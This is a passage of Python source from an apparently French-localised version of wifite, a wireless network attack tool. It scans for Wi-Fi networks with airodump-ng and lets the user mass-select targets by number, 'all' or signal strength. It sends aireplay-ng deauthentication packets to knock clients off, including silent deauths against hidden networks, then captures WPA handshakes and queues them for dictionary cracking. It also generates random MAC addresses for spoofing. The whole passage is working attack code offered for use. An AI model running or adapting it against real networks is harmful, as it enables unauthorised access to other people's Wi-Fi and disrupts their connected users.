				#logit('got handshake for "'+TARGETS[index][8]+'" stored handshake in "' + temp + '.cap"')
				HANDSHAKES += 1
				
				# add the filename and SSID to the list of 'to-crack' after everything's done
				WPA_CRACK.append([temp+'.cap', TARGETS[index][8]])
				break
				
			else:
				# no handshake yet
				print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+'] '+W+'Envoi de 3 paquets deauth; '+O+'Pas encore de handshake ',
				sys.stdout.flush()
			
			time.sleep(WPA_TIMEOUT)
			
			# check wpa-01.csv for new clients
			try:
				f=open(TEMPDIR+'wpa-01.csv','r')
				csv=f.read().split('\n')
				f.close()
			except Exception:
				pass
			
			thereyet=False
			for i in xrange(0, len(csv)):
				if csv[i].find('Station MAC,') != -1:
					thereyet=True
					
				elif thereyet==True:
					cli=csv[i].split(',')
					if len(cli) > 5:
						if cli[5].strip() == TARGETS[index][0]:
							# we have a client
							cli[0]=cli[0].strip()
							try:
								wpa_clients.index(cli[0])
							except ValueError:
								# client not in list! add it
								wpa_clients.append(cli[0])
								print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+\
								              '] '+G+'Nouveau client ajouté: '+W+cli[0]+', '+G+'au total: '+str(len(wpa_clients))+' '
			
		if got_handshake==False:
			print R+'\n['+sec2hms(0)+'] Impossible de capturer le Handshake, manque de temps (' + str(WPA_MAXWAIT) + ' sec)'
	
	except KeyboardInterrupt:
		# clean up
		subprocess.call(['rm','-rf',TEMPDIR+'wpa-01.cap',TEMPDIR+'wpa-01.csv',TEMPDIR+'wpa-01.kismet.csv',\
						TEMPDIR+'wpa-01.kismet.netxml'])
		try:
			os.kill(proc_read.pid, signal.SIGTERM)
			os.kill(proc_deauth.pid, signal.SIGTERM)
		except OSError:
			pass
		except UnboundLocalError:
			pass
		
		print R+'\n['+get_time(WPA_MAXWAIT,TIME_START)+\
				  '] '+R+'Attaque de "'+O+TARGETS[index][8]+R+'" interrompue'
		
		menu=''
		opts=''
		# check if there's other targets to attack
		for i in xrange(0,len(ATTACK)):
			if index==ATTACK[i]-1:
				if i < len(ATTACK) - 1:
					# more to come
					opts=G+'n'+W
					if i == len(ATTACK)-2:
						menu=G+'   Prochai[n]e attaque (il reste 1 cible)\n'
					else:
						menu=G+'   Prochai[n]e attaque (il reste '+str(len(ATTACK)-i-1)+' cibles)\n'
					break
		
		if len(WPA_CRACK) > 0 and DICT != '' and DICT != 'none':
			if opts != '':
				opts+=','
			opts+=O+'s'+W
			if len(WPA_CRACK) == 1:
				menu=menu+O+'   Pa[s]ser au crack du handshake WPA (vous avez 1 handshake à cracker)\n'
			else:
				menu=menu+O+'   Pa[s]ser au crack du handshake WPA (vous avez '+str(len(WPA_CRACK))+' handshakes à cracker)\n'
		
		if menu!= '':
			opts+=', ou '+R+'e'+W
			
			menu=menu+R+'   [e]xit'
			
			print GR+'\n[+] '+W+'Sélectionnez une option:'
			print menu
			print GR+'[+] '+W+'Entrez ('+opts+W+'):'+W,
			typed=raw_input()
			
			if typed=='n':
				#do nothing, next attack starts regardless
				return
			elif typed == 's':
				# skip to WPA cracking!
				SKIP_TO_WPA=True
				return
			else:
				#print GR+'[+] '+R+'exiting'
				#subprocess.call(['rm','-rf',TEMPDIR])
				#sys.exit(0)
				
				WPA_CRACK=[] # clear the wpa crack list
				SKIP_TO_WPA=True # skip to wpa cracking (will skip past wpa cracking)
				return
		else:
			# no reason to keep running! gtfo
			return
		
	print W
	# remove airodump log files
	subprocess.call(['rm','-rf',TEMPDIR+'wpa-01.cap',TEMPDIR+'wpa-01.csv',TEMPDIR+'wpa-01.kismet.csv',\
					TEMPDIR+'wpa-01.kismet.netxml'])
	
	# try to kill all processes
	try:
		os.kill(proc_read.pid, signal.SIGTERM)
		os.kill(proc_deauth.pid, signal.SIGTERM)
	except OSError:
		pass
	except UnboundLocalError:
		pass

def get_time(maxwait, starttime):
	""" returns the time remaining based on maxwait and starttime
		returns value in H:MM:SS format
	"""
	if maxwait == 0:
		return 'endless'
	else:
		return sec2hms(maxwait - (time.time() - starttime))

def gettargets():
	""" starts airodump-ng, outputs airodump data to 'wifite-01.csv'
	    searches for 10 seconds if user has selected 'all' essids
		searches only specified channels/encryptions if specified by user
		waits until a certain ssid appears if specified by user
		otherwise, waits for ctrl+c command from user to stop
		then,
		displays the results to the user, asks for which targets to attack
		adds targets to ATTACK list and returns
	"""
	global IFACE, CHANNEL, TARGETS, CLIENTS, ATTACK, ESSID, TEMPDIR
	
	TIME_START = time.time()
	waiting = -1
	
	try:
		subprocess.call(['rm','-rf',TEMPDIR+'wifite-01.cap',TEMPDIR+'wifite-01.csv',TEMPDIR+'wifite-01.kismet.csv',\
						TEMPDIR+'wifite-01.kismet.netxml'])
		time.sleep(0.3)
		
		cmd=['airodump-ng','-a','-w',TEMPDIR+'wifite','--output-format','csv']
		if CHANNEL != '0':
			cmd.append('-c')
			cmd.append(CHANNEL)
		cmd.append(IFACE)
		
		proc = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
		
		if ESSID == '':
			print GR+'[+] '+W+'Attente des cibles. Faites '+G+'Ctrl+C'+W+' lorsque vous êtes pret\n'
		elif ESSID == 'all' or ESSID.startswith('pow>'):
			time_wait=20
			if CHANNEL == '0':
				time_wait=30
			for i in xrange(time_wait, 0, -1):
				print GR+'\r[+] '+W+'Attendez '+G+str(i)+W+' secondes que les réseaux soient affichés. Faites '+O+'Ctrl+C'+W+' pour passer l\'attente ',
				sys.stdout.flush()
				time.sleep(1)
				parsetargets()
			
			print '\n'
		else:
			print GR+'[+] En attente de "'+G + ESSID +W+'" pour qu\'il apparaisse, faites '+O+'Ctrl+C'+W+' pour passer...'
		
		old=0
		oldc=0
		while 1:
			time.sleep(1)
			parsetargets()
			
			if ESSID != '' and ESSID != 'all' and not ESSID.startswith('pow>'):
				if waiting==-1:
					for x in xrange(0, len(TARGETS)):
						if TARGETS[x][8].lower() == ESSID.lower():
							print GR+'\n[+] "'+G+ESSID+W+'" trouvé, attente d\'un client pendant '+G+'5 sec'+W+'...',
							sys.stdout.flush()
							ATTACK=[x+1]
							waiting=0
							break
				else:
					for x in xrange(0, len(TARGETS)):
						if TARGETS[x][8].lower() == ESSID.lower():
							print GR+'\r[+] "'+G+ESSID+W+'" trouvé, attente d\'un client pendant '+G+str(5-waiting)+' sec'+W+'...',
							waiting += 1
							ATTACK=[x+1]
							
							if waiting == 6:
								break
							
					
					if waiting == 6:
						break
					sys.stdout.flush()
			else:
				print '\r'+GR+'['+sec2hms(time.time()-TIME_START)+ \
						'] '+G+str(len(TARGETS))+W+' cibles et '+G+str(len(CLIENTS))+W+' clients trouvés',
				
				if ESSID == 'all' or ESSID.startswith('pow>'):
					# wait for 10 seconds, then start cracking
					if time.time() - TIME_START >= 15:
						break
				sys.stdout.flush()
			
		print W
		
		os.kill(proc.pid, signal.SIGTERM)
		
	except KeyboardInterrupt:
		#print GR+'[+] '+O+'killing airodump-ng process (pid ' + str(proc.pid) + ') ...'+W
		print ''
		waiting=6
		try:
			os.kill(proc.pid, signal.SIGTERM)
		except UnboundLocalError:
			pass
	
	subprocess.call(['rm','-rf',TEMPDIR+'wifite-01.cap',TEMPDIR+'wifite-01.csv',TEMPDIR+'wifite-01.kismet.csv',\
					TEMPDIR+'wifite-01.kismet.netxml'])
	subprocess.call('rm -rf '+TEMPDIR+'wifite-01*.xor', shell=True)
	
	if ESSID == 'all':
		
		# add all targets to the list to attack
		ATTACK=xrange(0, len(TARGETS))
		if len(ATTACK) > 0:
			print GR+'[+] '+W+'Ciblage: ',
			for x in ATTACK:
				print '"'+G + TARGETS[x-1][8] + W+'"',
			print ''
		return
	
	elif ESSID.startswith('pow>'):
		ATTACK=[]
		try:
			power=int(ESSID[4:])
		except ValueError:
			print R+'[!] Puissance invalide: ' + ESSID + '; exit...'
			print W
			return
		
		print ''
		
		for i in xrange(0, len(TARGETS)):
			try:
				if int(TARGETS[i][5]) >= power:
					print GR+'[+] '+W+'Ajouté à la liste d\'attaque: "'+G + TARGETS[i][8] + W+'" ('+G + TARGETS[i][5] + 'dB'+W+')'
					ATTACK.append(i+1)
			except ValueError:
				print R+'[!] Niveau de puissance invalide: '+O + TARGETS[i][5] + R+'; on passe'
				continue
		
		# if we didn't add any targets...
		if ATTACK==[]:
			print R+'[+] Il n\'y a pas de cibles avec un niveau de puissance supérieure à '+O + str(power) + 'dB'
			print R+'[+] Essayez de choisir un '+O+'seuil de puissance plus faible'
			print W
			subprocess.call(['rm','-rf',TEMPDIR])
			sys.exit(0)
		
		print GR+'[+] '+G+str(len(ATTACK))+W+' réseaux ciblés pour l\'attaque'
		return
		
	elif ESSID != '':
		# see if we found the SSID we're looking for
		if waiting == 6:
			#print '[+] found "' + ESSID + '"!'
			return
		else:
			print GR+'[+] '+R+'Impossible de trouver "'+O + ESSID + R+'"'
	
	print ''
	if len(TARGETS) == 0:
		print R+'[!] Pas de cibles trouvées ! Soyez sur que '+O+'airodump-ng'+R+' fonctionne bien'
		print R+'[!] Le programme va se fermer'
		print W
		subprocess.call(['rm','-rf',TEMPDIR])
		sys.exit(0)
	
	print GR+'[+] '+W+'Sélectionnez le(s) '+G+'numéro(s)'+W+' des/de la cible(s) que vous voulez attaquer:'
	for i in xrange(0, len(TARGETS)):
		# get power dB
		try:
			tempdb=int(TARGETS[i][5])
		except ValueError:
			tempdb=0
		chcolor='G'
		if (i < 9):
			print '',
		
		print G+str(i+1) +W+'.',
		
		if tempdb >= 55:
			chcolor=G
		elif tempdb >= 40:
			chcolor=O
		else:
			chcolor=R
		
		print chcolor+'"'+ TARGETS[i][8] +'"',
		if len(TARGETS[i][8]) >= 25:
			print '\t',
			pass
		elif len(TARGETS[i][8]) > 17:
			print '\t\t',
		elif len(TARGETS[i][8]) >= 9:
			print '\t\t\t',
		elif len(TARGETS[i][8].strip()) == 0:
			print '\t\t\t\t\t',
		else:
			print '\t\t\t\t',
		print '(' + TARGETS[i][5] + 'dB ',
		print TARGETS[i][2][:3] + ')',
		
		if CLIENTS.get(TARGETS[i][0], None) != None:
			print G+'*CLIENT*'+W
		else:
			print ''
		
	
	print GR+'\n[+] '+W+'Pour sélectionner plusieurs choix, utilisez le '+C+'- (tiret)'+W+' et la '+C+', (virgule)'+W+' pour séparer'
	print GR+'[+] '+W+'Exemple: '+G+'1-3,5-6'+W+' va sélectionner les cibles '+C+'1, 2, 3, 5, 6'
	print GR+'[+] '+W+'Pour attaquer tout les réseaux, écrivez "'+G+'all'+W+'"'+G
	response = raw_input()
	
	ATTACK=stringtolist(response, len(TARGETS))
	if len(ATTACK) > 0:
		for x in ATTACK:
			print GR+'[+] '+W+'Ajout de "'+G + TARGETS[x-1][8] + W+'" à la liste d\'attaque'+W


def parsetargets():
	"""reads through 'wifite-01.csv' and adds any valid targets to the global list TARGETS """
	global TARGETS, CLIENTS, WEP, WPA, TEMPDIR, CHANNEL, IFACE, NO_HIDDEN_DEAUTH
	
	DEAUTH=[]
	TARGETS=[]
	try:
		f = open(TEMPDIR+'wifite-01.csv', 'r')
		clients=False
		lines = f.readlines()
		for line in lines:
			if line.find('Station MAC') != -1:
				CLIENTS={}
				clients=True
				
			elif line.find('Authentication') == -1 and clients == False:
				# access point
				temp=line.split(', ')
				if len(temp) >= 12 and temp[len(temp)-2].split() != '':
					if temp[5].find('WPA') != -1 and WPA==True or \
					   temp[5].find('WEP') != -1 and WEP==True:
						# remove uneccessary data
						if temp[6].find(',') != -1:
							# need to split authentication for WPA (CCMP,PSK)
							temp.insert(7, temp[6][temp[6].find(',')+1:])
							temp[6] = temp[6][:temp[6].find(',')]
						temp.pop(1) # remove date/time first seen
						temp.pop(1) # remove date/time last seen
						temp.pop(2) # remove speed
						temp.pop(6) # number of beacons
						temp.pop(7) # LAN ip
						temp.pop(len(temp)-1)
						# get rid of trailing/leading spaces
						temp[1] = temp[1].strip()
						temp[2] = temp[2].strip()
						temp[5] = temp[5].strip()
						temp[6] = temp[6].strip()
						temp[7] = temp[7].strip()
						if int(temp[5]) < 0:
							temp[5] = str(int(temp[5]) + 100)
							
						if int(temp[7]) == len(temp[8]) and temp[8] != '' and temp[8] != ( chr(0) * len(temp[8])):
							TARGETS.append(temp)
							
						elif temp[8] == ( chr(0) * len(temp[8])) and CHANNEL != '0':
							# it's a hidden network and we're on a fixed channel
							client=CLIENTS.get(temp[0],None)
							if client != None and NO_HIDDEN_DEAUTH==False:
								# we have a client, better call deauth
								
								deauth_cmd = ['aireplay-ng','-0','1','-a',temp[0],'-c',client,IFACE]
								DEAUTH.append(deauth_cmd)
							
				
			elif line.find('Station MAC') == -1 and clients == True:
				# client
				temp=line.split(',')
				if len(temp) > 5:
					#CLIENTS.append([ temp[0], temp[5] ])
					if CLIENTS.get(temp[5].strip(), None) == None:
						CLIENTS[temp[5].strip()] = temp[0]
		f.close()
	except IOError:
		print R+'\n[!] Le programme est incapable de capturer les paquets airodump!'
		print R+'[+] SVP vous assurer d\'avoir aircrack-ng v1.1 ou supérieur'
		print R+'[+] Le programme est incapable de continuer et il va se fermer'
		print W
		subprocess.call(['rm','-rf',TEMPDIR])
		sys.exit(0)
	
	# sort the targets by power
	TARGETS = sorted(TARGETS, key=lambda targets: targets[5], reverse=True)
	
	if len(DEAUTH) > 0:
		msg='[Envoi de deauth caché'
		if len(DEAUTH) > 1:
			msg+='s'
		msg+=']'
		print ''+O+' [Envoi de deauth caché] '+W,
		for d in DEAUTH:
			sys.stdout.flush()
			subprocess.call(d, stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
	else:
		print '                         ',
	


def stringtolist(s, most):
	"""
	receives string, returns list
	sorts low-to-high, removes duplicates, truncates anything more than 'most'
	'all'   returns entire list (1 to most)
	'a-b'   selection, separated by hyphen, adds everything between and including numbers a and b
	'a,b,c' multiple selection, separated by commas, adds a b and c
	'a'     single selection, just the number, adds a
	"""
	
	lst=[]
	try:
		if s == 'all' or s == '"all"':
			for i in xrange(1, most+1):
				lst.append(i)
		elif s.find(',') == -1 and s.find('-') == -1:
			lst=[int(s)]
		else:
			sub=s.split(',')
			for i in sub:
				if i.find('-') != -1:
					tmp=i.split('-')
					for j in xrange(int(tmp[0]), int(tmp[1]) + 1):
						lst.append(j)
				else:
					lst.append(int(i))
	except ValueError:
		print R+'[+] Erreur! entrée invalide'+W
	
	lst = sorted(lst)
	
	# remove duplicates
	i = 0
	while i < len(lst) - 1:
		if lst[i] == lst[i+1] or lst[i] > most:
			lst.pop(i)
			i -= 1
		i += 1
	
	if len(lst) == 0:
		return []
	if lst[len(lst)-1] > most:
		lst.pop(len(lst)-1)
	
	return lst

def datetime():
	""" returns current date/time in [yyyy-mm-dd hh:mm:ss] format, used by logit() """
	return '[' + time.strftime("%Y-%m-%d %H:%M:%S") + ']'

def sec2hms(sec):
	""" converts seconds to h:mm:ss format"""
	if sec < 0:
		return '0:00:00'
	s = int(sec)
	h=int(s/3600)
	s=s%3600
	m=int(s/60)
	s=s%60
	result='' + str(h) + ':'
	if m < 10:
		result += '0'
	result += str(m) + ':'
	if s < 10:
		result += '0'
	result += str(s)
	
	return result

def random_mac():
	""" generates a random mac address
		not *too* random, chances of it being from an actual vendor are likely """
	# ranges used:
	# 00-00-00 -> 00-27-FF ALL
	# 00-30-00 -> 00-E0-FF (00-X0-XX)
	
	lst=['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F']
	if random.randint(0,1) == 0:
		result = '00:'
		temp = str(random.randint(0,27))
		if len(temp) == 1:
			temp='0'+temp
		result+=temp+':'
		for i in xrange(0,8):
			result+=lst[random.randint(0,15)]
			if i % 2 == 1 and i < 7:
				result+=':'
	else:
		result='00:' + lst[random.randint(3,14)] + '0:'
		
		for i in xrange(0,8):
			result+=lst[random.randint(0,15)]
			if i % 2 == 1 and i < 7:
				result+=':'
	
	return result

main() # launch the main method
subprocess.call(['rm','-rf',TEMPDIR])
subprocess.call('rm -rf /tmp/wifite*', shell=True, stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))

# helpful diagram!
# TARGETS list format
# ['XX:XX:XX:XX:XX:XX', '1', 'WPA2WPA', 'CCMP', 'PSK', '48', '0',  '11',  'Belkin.A38E']
#  BSSID,            CHANNEL,  ENC,      CYPH,   ??,   POWER,IVS,SSID_LEN,    SSID
#    0                  1       2         3      4       5    6     7          8
